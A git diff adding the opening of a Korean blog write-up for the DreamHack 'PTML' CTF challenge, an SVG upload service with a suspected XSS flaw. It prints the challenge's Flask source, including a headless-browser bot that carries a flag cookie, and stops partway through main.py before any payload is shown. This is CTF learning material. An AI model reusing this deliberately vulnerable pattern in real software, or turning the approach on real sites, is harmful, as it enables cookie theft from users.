@@ -265,21 +265,21 @@
                             <ul tabindex="0" class="dropdown-content menu bg-base-100 border border-gray-500/15 rounded-box z-1 p-2 shadow-sm">
                                 
                                     <li>
-                                        <a class="btn btn-ghost px-2 lg:px-3 hover:no-underline" href="https://www.instagram.com/parkpingx2">
+                                        <a class="btn btn-ghost px-2 lg:px-3 hover:no-underline" href="/hack">
                                             <i class="fa-brands fa-napster"></i>
                                             해킹
                                         </a>
                                     </li>
                                 
                                     <li>
-                                        <a class="btn btn-ghost px-2 lg:px-3 hover:no-underline" href="https://www.youtube.com/@parkpingx2">
+                                        <a class="btn btn-ghost px-2 lg:px-3 hover:no-underline" href="/dev">
                                             <i class="fa-brands fa-dev"></i>
                                             개발
                                         </a>
                                     </li>
                                 
                                     <li>
-                                        <a class="btn btn-ghost px-2 lg:px-3 hover:no-underline" href="https://github.com/parkpingx2">
+                                        <a class="btn btn-ghost px-2 lg:px-3 hover:no-underline" href="/enjoy">
                                             <i class="fa-brands fa-odnoklassniki"></i>
                                             일상
                                         </a>
@@ -319,7 +319,415 @@
         </h1>
         <p class="text-gray-500">pwn : DreamHack Unit 6,7,8 학습 | web : Level2 - PTML 풀이</p>
     </div>
-    
+    <h1 id="dreamhack-web-level-2-ptml-write-up">DreamHack Web Level 2 - PTML write-up</h1>
+<h2 id="munje-seolmyeong-mic-gibon-dongjag-hwagin">문제 설명 및 기본 동작 확인</h2>
+<p>해당 문제는 주말에 하는 Dreamhack CTF Season 7 Round #9(🚩Div1) 에 출제되었던 문제이다.<br />
+svg 를 보여주는 서비스라고 하는데 XSS의 향기가 난다..!
+<img src="https://parkpingx2.github.io/study/2025-12-w4/images/ptml1.png" alt="1" /></p>
+<p>심플하게 svg 파일을 업로드하고, Upload SVG 버튼을 누르면 svg파일인지 확인하여 맞으면 렌더링,<br />
+아니면 invalid SVG!! 라는 문자열을 보여준다.
+<img src="https://parkpingx2.github.io/study/2025-12-w4/images/ptml2.png" alt="2" /></p>
+<p><img src="https://parkpingx2.github.io/study/2025-12-w4/images/ptml3.png" alt="3" /></p>
+<h2 id="soseukodeu-bunseog">소스코드 분석</h2>
+<p>소스코드를 다운받아보면 다음과 같은 파일구조가 보이는데<br />
+이러한 파일에서 주로 봐야할 파일들은 도커파일 등 각 설정이 담긴 파일,<br />
+주요 코드가 담겨있는 메인 파일들 main.py , app.py (혹은 .js 등) 이다.</p>
+<pre data-lang="bash" style="background-color:#212733;color:#ccc9c2;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#ffd580;">➜</span><span>  PTML tree
+</span><span style="color:#f28779;">.
+</span><span style="color:#ffd580;">├──</span><span> deploy
+</span><span style="color:#ffd580;">│</span><span>   ├── Dockerfile  </span><span style="color:#f29e74;">*
+</span><span style="color:#ffd580;">│</span><span>   ├── app.py  </span><span style="color:#f29e74;">*
+</span><span style="color:#ffd580;">│</span><span>   ├── requirements.txt
+</span><span style="color:#ffd580;">│</span><span>   ├── static
+</span><span style="color:#ffd580;">│</span><span>   │   └── main.py  </span><span style="color:#f29e74;">*
+</span><span style="color:#ffd580;">│</span><span>   ├── templates
+</span><span style="color:#ffd580;">│</span><span>   │   └── index.html
+</span><span style="color:#ffd580;">│</span><span>   └── uploads
+</span><span style="color:#ffd580;">│</span><span>       └── default.svg
+</span><span style="color:#ffd580;">└──</span><span> docker-compose.yml  </span><span style="color:#f29e74;">*
+</span><span>
+</span><span style="color:#ffd580;">5</span><span> directories, 7 files
+</span></code></pre>
+<p>하지만 이 문제에서는 app.py , main.py 만 분석하면 된다 :)</p>
+<h3 id="app-py">app.py</h3>
+<div tabindex="0" class="collapse collapse-arrow bg-base-100 border-gray-500/15 border">
+  <div class="collapse-title font-semibold">
+    코드 전체 보기
+  </div>
+  <div class="collapse-content text-sm">
+    <pre data-lang="python" style="background-color:#212733;color:#ccc9c2;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#ffa759;">from </span><span>flask </span><span style="color:#ffa759;">import </span><span>Flask</span><span style="color:#ccc9c2cc;">, </span><span>request</span><span style="color:#ccc9c2cc;">, </span><span>send_from_directory</span><span style="color:#ccc9c2cc;">, </span><span>redirect</span><span style="color:#ccc9c2cc;">, </span><span>url_for</span><span style="color:#ccc9c2cc;">, </span><span>render_template</span><span style="color:#ccc9c2cc;">, </span><span>current_app
+</span><span style="color:#ffa759;">from </span><span>werkzeug</span><span style="color:#f29e74;">.</span><span>utils </span><span style="color:#ffa759;">import </span><span>secure_filename
+</span><span style="color:#ffa759;">import </span><span>os
+</span><span style="color:#ffa759;">import </span><span>threading
+</span><span style="color:#ffa759;">import </span><span>time
+</span><span style="color:#ffa759;">import </span><span>uuid
+</span><span style="color:#ffa759;">from </span><span>selenium </span><span style="color:#ffa759;">import </span><span>webdriver
+</span><span style="color:#ffa759;">from </span><span>selenium</span><span style="color:#f29e74;">.</span><span>webdriver</span><span style="color:#f29e74;">.</span><span>chrome</span><span style="color:#f29e74;">.</span><span>service </span><span style="color:#ffa759;">import </span><span>Service
+</span><span style="color:#ffa759;">from </span><span>selenium</span><span style="color:#f29e74;">.</span><span>webdriver</span><span style="color:#f29e74;">.</span><span>support</span><span style="color:#f29e74;">.</span><span>ui </span><span style="color:#ffa759;">import </span><span>WebDriverWait
+</span><span style="color:#ffa759;">from </span><span>selenium</span><span style="color:#f29e74;">.</span><span>webdriver</span><span style="color:#f29e74;">.</span><span>support </span><span style="color:#ffa759;">import </span><span>expected_conditions </span><span style="color:#ffa759;">as </span><span>EC
+</span><span style="color:#ffa759;">from </span><span>selenium</span><span style="color:#f29e74;">.</span><span>webdriver</span><span style="color:#f29e74;">.</span><span>common</span><span style="color:#f29e74;">.</span><span>by </span><span style="color:#ffa759;">import </span><span>By
+</span><span>
+</span><span>app </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">Flask</span><span>(__name__)
+</span><span>UPLOAD_FOLDER </span><span style="color:#f29e74;">= </span><span style="color:#bae67e;">&#39;uploads&#39;
+</span><span>app</span><span style="color:#f29e74;">.</span><span>config[</span><span style="color:#bae67e;">&#39;UPLOAD_FOLDER&#39;</span><span>] </span><span style="color:#f29e74;">= </span><span>UPLOAD_FOLDER
+</span><span>
+</span><span>os</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">makedirs</span><span>(UPLOAD_FOLDER</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">exist_ok</span><span style="color:#f29e74;">=</span><span style="color:#ffcc66;">True</span><span>)
+</span><span>
+</span><span style="color:#ffa759;">try</span><span>:
+</span><span>    FLAG </span><span style="color:#f29e74;">= </span><span style="color:#f28779;">open</span><span>(</span><span style="color:#bae67e;">&quot;./flag&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;r&quot;</span><span>)</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">read</span><span>()
+</span><span style="color:#ffa759;">except</span><span>:
+</span><span>    FLAG </span><span style="color:#f29e74;">= </span><span style="color:#bae67e;">&quot;[**FLAG**]&quot;
+</span><span>
+</span><span style="color:#ccc9c2cc;">@</span><span>app</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">route</span><span>(</span><span style="color:#bae67e;">&#39;/&#39;</span><span>)
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">index</span><span>():
+</span><span>    file </span><span style="color:#f29e74;">= </span><span>request</span><span style="color:#f29e74;">.</span><span>args</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">get</span><span>(</span><span style="color:#bae67e;">&#39;file&#39;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&#39;uploads/default.svg&#39;</span><span>)
+</span><span>    </span><span style="color:#ffa759;">return </span><span style="color:#ffd580;">render_template</span><span>(</span><span style="color:#bae67e;">&#39;index.html&#39;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">file</span><span style="color:#f29e74;">=</span><span>file)
+</span><span>
+</span><span style="color:#ccc9c2cc;">@</span><span>app</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">route</span><span>(</span><span style="color:#bae67e;">&#39;/uploads/&lt;filename&gt;&#39;</span><span>)
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">uploaded_file</span><span>(</span><span style="color:#ffcc66;">filename</span><span>):
+</span><span>    </span><span style="color:#ffa759;">return </span><span style="color:#ffd580;">send_from_directory</span><span>(app</span><span style="color:#f29e74;">.</span><span>config[</span><span style="color:#bae67e;">&#39;UPLOAD_FOLDER&#39;</span><span>]</span><span style="color:#ccc9c2cc;">, </span><span>filename)
+</span><span>
+</span><span style="color:#ccc9c2cc;">@</span><span>app</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">route</span><span>(</span><span style="color:#bae67e;">&#39;/upload&#39;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">methods</span><span style="color:#f29e74;">=</span><span>[</span><span style="color:#bae67e;">&#39;POST&#39;</span><span>])
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">upload_file</span><span>():
+</span><span>    </span><span style="color:#ffa759;">if </span><span style="color:#bae67e;">&#39;file&#39; </span><span style="color:#f29e74;">not in </span><span>request</span><span style="color:#f29e74;">.</span><span>files:
+</span><span>        </span><span style="color:#ffa759;">return </span><span style="color:#ffd580;">redirect</span><span>(request</span><span style="color:#f29e74;">.</span><span>url)
+</span><span>    file </span><span style="color:#f29e74;">= </span><span>request</span><span style="color:#f29e74;">.</span><span>files[</span><span style="color:#bae67e;">&#39;file&#39;</span><span>]
+</span><span>    </span><span style="color:#ffa759;">if </span><span>file</span><span style="color:#f29e74;">.</span><span>filename </span><span style="color:#f29e74;">== </span><span style="color:#bae67e;">&#39;&#39;</span><span>:
+</span><span>        </span><span style="color:#ffa759;">return </span><span style="color:#ffd580;">redirect</span><span>(request</span><span style="color:#f29e74;">.</span><span>url)
+</span><span>    </span><span style="color:#ffa759;">if </span><span>file:
+</span><span>        filename </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">secure_filename</span><span>(file</span><span style="color:#f29e74;">.</span><span>filename)
+</span><span>        unique_id </span><span style="color:#f29e74;">= </span><span>uuid</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">uuid4</span><span>()</span><span style="color:#f29e74;">.</span><span>hex
+</span><span>        unique_filename </span><span style="color:#f29e74;">= </span><span style="color:#ffa759;">f</span><span style="color:#bae67e;">&quot;</span><span>{unique_id}</span><span style="color:#bae67e;">_</span><span>{filename}</span><span style="color:#bae67e;">&quot;
+</span><span>        file_path </span><span style="color:#f29e74;">= </span><span>os</span><span style="color:#f29e74;">.</span><span>path</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">join</span><span>(app</span><span style="color:#f29e74;">.</span><span>config[</span><span style="color:#bae67e;">&#39;UPLOAD_FOLDER&#39;</span><span>]</span><span style="color:#ccc9c2cc;">, </span><span>unique_filename)
+</span><span>        file</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">save</span><span>(file_path)
+</span><span>        </span><span style="color:#ffd580;">read_file</span><span>(unique_filename)
+</span><span>        </span><span style="color:#ffa759;">return </span><span style="color:#ffd580;">redirect</span><span>(</span><span style="color:#ffd580;">url_for</span><span>(</span><span style="color:#bae67e;">&#39;index&#39;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">file</span><span style="color:#f29e74;">=</span><span style="color:#ffa759;">f</span><span style="color:#bae67e;">&#39;uploads/</span><span>{unique_filename}</span><span style="color:#bae67e;">&#39;</span><span>))
+</span><span>    </span><span style="color:#ffa759;">return </span><span style="color:#bae67e;">&#39;&#39;</span><span>, </span><span style="color:#ffcc66;">204
+</span><span>
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">read_file</span><span>(</span><span style="color:#ffcc66;">filename</span><span>):
+</span><span>    driver </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">None
+</span><span>    cookie </span><span style="color:#f29e74;">= </span><span>{</span><span style="color:#bae67e;">&quot;name&quot;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#bae67e;">&quot;flag&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;value&quot;</span><span style="color:#ccc9c2cc;">: </span><span>FLAG}
+</span><span>    cookie</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">update</span><span>({</span><span style="color:#bae67e;">&quot;domain&quot;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#bae67e;">&quot;127.0.0.1&quot;</span><span>})
+</span><span>    </span><span style="color:#ffa759;">try</span><span>:
+</span><span>        service </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">Service</span><span>(</span><span style="color:#ffcc66;">executable_path</span><span style="color:#f29e74;">=</span><span style="color:#bae67e;">&quot;/usr/local/bin/chromedriver&quot;</span><span>)
+</span><span>        options </span><span style="color:#f29e74;">= </span><span>webdriver</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">ChromeOptions</span><span>()
+</span><span>        </span><span style="color:#ffa759;">for </span><span>arg </span><span style="color:#ffa759;">in </span><span>[
+</span><span>            </span><span style="color:#bae67e;">&quot;headless&quot;</span><span style="color:#ccc9c2cc;">,
+</span><span>            </span><span style="color:#bae67e;">&quot;window-size=1920x1080&quot;</span><span style="color:#ccc9c2cc;">,
+</span><span>            </span><span style="color:#bae67e;">&quot;disable-gpu&quot;</span><span style="color:#ccc9c2cc;">,
+</span><span>            </span><span style="color:#bae67e;">&quot;no-sandbox&quot;</span><span style="color:#ccc9c2cc;">,
+</span><span>            </span><span style="color:#bae67e;">&quot;disable-dev-shm-usage&quot;</span><span style="color:#ccc9c2cc;">,
+</span><span>        ]:
+</span><span>            options</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">add_argument</span><span>(arg)
+</span><span>
+</span><span>        driver </span><span style="color:#f29e74;">= </span><span>webdriver</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">Chrome</span><span>(</span><span style="color:#ffcc66;">service</span><span style="color:#f29e74;">=</span><span>service</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">options</span><span style="color:#f29e74;">=</span><span>options)
+</span><span>        driver</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">implicitly_wait</span><span>(</span><span style="color:#ffcc66;">3</span><span>)
+</span><span>        driver</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">set_page_load_timeout</span><span>(</span><span style="color:#ffcc66;">3</span><span>)
+</span><span>
+</span><span>        driver</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">get</span><span>(</span><span style="color:#bae67e;">&quot;http://127.0.0.1:8000/&quot;</span><span>)
+</span><span>        driver</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">add_cookie</span><span>(cookie)
+</span><span>        driver</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">get</span><span>(</span><span style="color:#ffa759;">f</span><span style="color:#bae67e;">&quot;http://127.0.0.1:8000/?file=uploads/</span><span>{filename}</span><span style="color:#bae67e;">&quot;</span><span>)
+</span><span>
+</span><span>        </span><span style="color:#ffd580;">WebDriverWait</span><span>(driver</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">10</span><span>)</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">until</span><span>(EC</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">presence_of_element_located</span><span>((By</span><span style="color:#f29e74;">.</span><span>TAG_NAME</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;svg&quot;</span><span>)))
+</span><span>
+</span><span>    </span><span style="color:#ffa759;">except </span><span style="font-style:italic;color:#5ccfe6;">Exception </span><span style="color:#ffa759;">as </span><span>e:
+</span><span>        driver</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">quit</span><span>()
+</span><span>        </span><span style="color:#ffa759;">return </span><span style="color:#ffcc66;">False
+</span><span>    driver</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">quit</span><span>()
+</span><span>    </span><span style="color:#ffa759;">return </span><span style="color:#ffcc66;">True
+</span><span>
+</span><span style="color:#ffa759;">if </span><span>__name__ </span><span style="color:#f29e74;">== </span><span style="color:#bae67e;">&#39;__main__&#39;</span><span>:
+</span><span>    app</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">run</span><span>(</span><span style="color:#ffcc66;">host</span><span style="color:#f29e74;">=</span><span style="color:#bae67e;">&#39;0.0.0.0&#39;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">port</span><span style="color:#f29e74;">=</span><span style="color:#ffcc66;">8000</span><span>)
+</span></code></pre>
+
+  </div>
+</div>
+<h4 id="upload-file">upload_file()</h4>
+<p>/upload 경로는 파일을 업로드 하는 함수 upload_file() 이 구현되어있다.<br />
+파일 업로드 시 uuid.uuid4().hex 를 통해 임의의 파일명으로 조합하여 업로드한다.</p>
+<pre data-lang="python" style="background-color:#212733;color:#ccc9c2;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#ccc9c2cc;">@</span><span>app</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">route</span><span>(</span><span style="color:#bae67e;">&#39;/upload&#39;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">methods</span><span style="color:#f29e74;">=</span><span>[</span><span style="color:#bae67e;">&#39;POST&#39;</span><span>])
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">upload_file</span><span>():
+</span><span>    </span><span style="color:#ffa759;">if </span><span style="color:#bae67e;">&#39;file&#39; </span><span style="color:#f29e74;">not in </span><span>request</span><span style="color:#f29e74;">.</span><span>files:
+</span><span>        </span><span style="color:#ffa759;">return </span><span style="color:#ffd580;">redirect</span><span>(request</span><span style="color:#f29e74;">.</span><span>url)
+</span><span>    file </span><span style="color:#f29e74;">= </span><span>request</span><span style="color:#f29e74;">.</span><span>files[</span><span style="color:#bae67e;">&#39;file&#39;</span><span>]
+</span><span>    </span><span style="color:#ffa759;">if </span><span>file</span><span style="color:#f29e74;">.</span><span>filename </span><span style="color:#f29e74;">== </span><span style="color:#bae67e;">&#39;&#39;</span><span>:
+</span><span>        </span><span style="color:#ffa759;">return </span><span style="color:#ffd580;">redirect</span><span>(request</span><span style="color:#f29e74;">.</span><span>url)
+</span><span>    </span><span style="color:#ffa759;">if </span><span>file:
+</span><span>        filename </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">secure_filename</span><span>(file</span><span style="color:#f29e74;">.</span><span>filename)
+</span><span>        unique_id </span><span style="color:#f29e74;">= </span><span>uuid</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">uuid4</span><span>()</span><span style="color:#f29e74;">.</span><span>hex
+</span><span>        unique_filename </span><span style="color:#f29e74;">= </span><span style="color:#ffa759;">f</span><span style="color:#bae67e;">&quot;</span><span>{unique_id}</span><span style="color:#bae67e;">_</span><span>{filename}</span><span style="color:#bae67e;">&quot;
+</span><span>        file_path </span><span style="color:#f29e74;">= </span><span>os</span><span style="color:#f29e74;">.</span><span>path</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">join</span><span>(app</span><span style="color:#f29e74;">.</span><span>config[</span><span style="color:#bae67e;">&#39;UPLOAD_FOLDER&#39;</span><span>]</span><span style="color:#ccc9c2cc;">, </span><span>unique_filename)
+</span><span>        file</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">save</span><span>(file_path)
+</span><span>        </span><span style="color:#ffd580;">read_file</span><span>(unique_filename)
+</span><span>        </span><span style="color:#ffa759;">return </span><span style="color:#ffd580;">redirect</span><span>(</span><span style="color:#ffd580;">url_for</span><span>(</span><span style="color:#bae67e;">&#39;index&#39;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">file</span><span style="color:#f29e74;">=</span><span style="color:#ffa759;">f</span><span style="color:#bae67e;">&#39;uploads/</span><span>{unique_filename}</span><span style="color:#bae67e;">&#39;</span><span>))
+</span><span>    </span><span style="color:#ffa759;">return </span><span style="color:#bae67e;">&#39;&#39;</span><span>, </span><span style="color:#ffcc66;">204
+</span></code></pre>
+<h4 id="read-file">read_file()</h4>
+<p>read_file() 함수는 브라우저가 로컬에서 취약점을 트리거 해줄 수 있도록 구현한 크롬 드라이버 이다.<br />
+XSS 의 경우 클라이언트 취약점이기 때문에 특성 상 공격을 당해줄 대상이 필요한데,<br />
+워게임 혹은 CTF에서는 보통 크롬 드라이버를 통해 XSS 공격을 자동으로 트리거 해주도록 구현하고 있다.</p>
+<pre data-lang="python" style="background-color:#212733;color:#ccc9c2;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#ffa759;">def </span><span style="color:#ffd580;">read_file</span><span>(</span><span style="color:#ffcc66;">filename</span><span>):
+</span><span>    driver </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">None
+</span><span>    cookie </span><span style="color:#f29e74;">= </span><span>{</span><span style="color:#bae67e;">&quot;name&quot;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#bae67e;">&quot;flag&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;value&quot;</span><span style="color:#ccc9c2cc;">: </span><span>FLAG}
+</span><span>    cookie</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">update</span><span>({</span><span style="color:#bae67e;">&quot;domain&quot;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#bae67e;">&quot;127.0.0.1&quot;</span><span>})
+</span><span>    </span><span style="color:#ffa759;">try</span><span>:
+</span><span>        service </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">Service</span><span>(</span><span style="color:#ffcc66;">executable_path</span><span style="color:#f29e74;">=</span><span style="color:#bae67e;">&quot;/usr/local/bin/chromedriver&quot;</span><span>)
+</span><span>        options </span><span style="color:#f29e74;">= </span><span>webdriver</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">ChromeOptions</span><span>()
+</span><span>        </span><span style="color:#ffa759;">for </span><span>arg </span><span style="color:#ffa759;">in </span><span>[
+</span><span>            </span><span style="color:#bae67e;">&quot;headless&quot;</span><span style="color:#ccc9c2cc;">,
+</span><span>            </span><span style="color:#bae67e;">&quot;window-size=1920x1080&quot;</span><span style="color:#ccc9c2cc;">,
+</span><span>            </span><span style="color:#bae67e;">&quot;disable-gpu&quot;</span><span style="color:#ccc9c2cc;">,
+</span><span>            </span><span style="color:#bae67e;">&quot;no-sandbox&quot;</span><span style="color:#ccc9c2cc;">,
+</span><span>            </span><span style="color:#bae67e;">&quot;disable-dev-shm-usage&quot;</span><span style="color:#ccc9c2cc;">,
+</span><span>        ]:
+</span><span>            options</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">add_argument</span><span>(arg)
+</span><span>
+</span><span>        driver </span><span style="color:#f29e74;">= </span><span>webdriver</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">Chrome</span><span>(</span><span style="color:#ffcc66;">service</span><span style="color:#f29e74;">=</span><span>service</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">options</span><span style="color:#f29e74;">=</span><span>options)
+</span><span>        driver</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">implicitly_wait</span><span>(</span><span style="color:#ffcc66;">3</span><span>)
+</span><span>        driver</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">set_page_load_timeout</span><span>(</span><span style="color:#ffcc66;">3</span><span>)
+</span><span>
+</span><span>        driver</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">get</span><span>(</span><span style="color:#bae67e;">&quot;http://127.0.0.1:8000/&quot;</span><span>)
+</span><span>        driver</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">add_cookie</span><span>(cookie)
+</span><span>        driver</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">get</span><span>(</span><span style="color:#ffa759;">f</span><span style="color:#bae67e;">&quot;http://127.0.0.1:8000/?file=uploads/</span><span>{filename}</span><span style="color:#bae67e;">&quot;</span><span>)
+</span><span>
+</span><span>        </span><span style="color:#ffd580;">WebDriverWait</span><span>(driver</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">10</span><span>)</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">until</span><span>(EC</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">presence_of_element_located</span><span>((By</span><span style="color:#f29e74;">.</span><span>TAG_NAME</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;svg&quot;</span><span>)))
+</span><span>
+</span><span>    </span><span style="color:#ffa759;">except </span><span style="font-style:italic;color:#5ccfe6;">Exception </span><span style="color:#ffa759;">as </span><span>e:
+</span><span>        driver</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">quit</span><span>()
+</span><span>        </span><span style="color:#ffa759;">return </span><span style="color:#ffcc66;">False
+</span><span>    driver</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">quit</span><span>()
+</span><span>    </span><span style="color:#ffa759;">return </span><span style="color:#ffcc66;">True
+</span></code></pre>
+<h3 id="main-py">main.py</h3>
+<div tabindex="0" class="collapse collapse-arrow bg-base-100 border-gray-500/15 border">
+  <div class="collapse-title font-semibold">
+    코드 전체 보기
+  </div>
+  <div class="collapse-content text-sm">
+    <pre data-lang="python" style="background-color:#212733;color:#ccc9c2;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#ffa759;">import </span><span>random
+</span><span style="color:#ffa759;">from </span><span>js </span><span style="color:#ffa759;">import </span><span>document</span><span style="color:#ccc9c2cc;">, </span><span>DOMParser</span><span style="color:#ccc9c2cc;">, </span><span>URL</span><span style="color:#ccc9c2cc;">, </span><span>FileReader</span><span style="color:#ccc9c2cc;">, </span><span>console</span><span style="color:#ccc9c2cc;">, </span><span>setTimeout</span><span style="color:#ccc9c2cc;">, </span><span>window
+</span><span style="color:#ffa759;">from </span><span>pyodide</span><span style="color:#f29e74;">.</span><span>http </span><span style="color:#ffa759;">import </span><span>pyfetch
+</span><span style="color:#ffa759;">from </span><span>pyodide</span><span style="color:#f29e74;">.</span><span>ffi </span><span style="color:#ffa759;">import </span><span>create_proxy
+</span><span style="color:#ffa759;">from </span><span>pyodide</span><span style="color:#f29e74;">.</span><span>ffi</span><span style="color:#f29e74;">.</span><span>wrappers </span><span style="color:#ffa759;">import </span><span>set_interval</span><span style="color:#ccc9c2cc;">, </span><span>clear_interval
+</span><span>
+</span><span>svg_mover </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">None
+</span><span>
+</span><span style="color:#ffa759;">class </span><span style="color:#73d0ff;">SvgMover</span><span>:
+</span><span>    </span><span style="color:#ffa759;">def </span><span style="color:#f28779;">__init__</span><span>(</span><span style="color:#ffcc66;">self</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">svg_element</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">interval</span><span style="color:#f29e74;">=</span><span style="color:#ffcc66;">100</span><span>):
+</span><span>        </span><span style="font-style:italic;color:#5ccfe6;">self</span><span style="color:#f29e74;">.</span><span>svg_element </span><span style="color:#f29e74;">= </span><span>svg_element
+</span><span>        </span><span style="font-style:italic;color:#5ccfe6;">self</span><span style="color:#f29e74;">.</span><span>container </span><span style="color:#f29e74;">= </span><span>document</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">getElementById</span><span>(</span><span style="color:#bae67e;">&#39;svg-container&#39;</span><span>)
+</span><span>        </span><span style="font-style:italic;color:#5ccfe6;">self</span><span style="color:#f29e74;">.</span><span>container</span><span style="color:#f29e74;">.</span><span>innerHTML </span><span style="color:#f29e74;">= </span><span style="color:#bae67e;">&quot;&quot;
+</span><span>        </span><span style="font-style:italic;color:#5ccfe6;">self</span><span style="color:#f29e74;">.</span><span>container</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">appendChild</span><span>(</span><span style="font-style:italic;color:#5ccfe6;">self</span><span style="color:#f29e74;">.</span><span>svg_element)
+</span><span>
+</span><span>        </span><span style="font-style:italic;color:#5ccfe6;">self</span><span style="color:#f29e74;">.</span><span>paths </span><span style="color:#f29e74;">= </span><span style="font-style:italic;color:#5ccfe6;">self</span><span style="color:#f29e74;">.</span><span>svg_element</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">getElementsByTagName</span><span>(</span><span style="color:#bae67e;">&quot;path&quot;</span><span>)
+</span><span>
+</span><span>        </span><span style="font-style:italic;color:#5ccfe6;">self</span><span style="color:#f29e74;">.</span><span>positions </span><span style="color:#f29e74;">= </span><span>[{</span><span style="color:#bae67e;">&#39;x&#39;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&#39;y&#39;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#ffcc66;">0</span><span>} </span><span style="color:#ffa759;">for </span><span style="font-style:italic;color:#5ccfe6;">_ </span><span style="color:#ffa759;">in </span><span style="color:#f28779;">range</span><span>(</span><span style="color:#f28779;">len</span><span>(</span><span style="font-style:italic;color:#5ccfe6;">self</span><span style="color:#f29e74;">.</span><span>paths))]
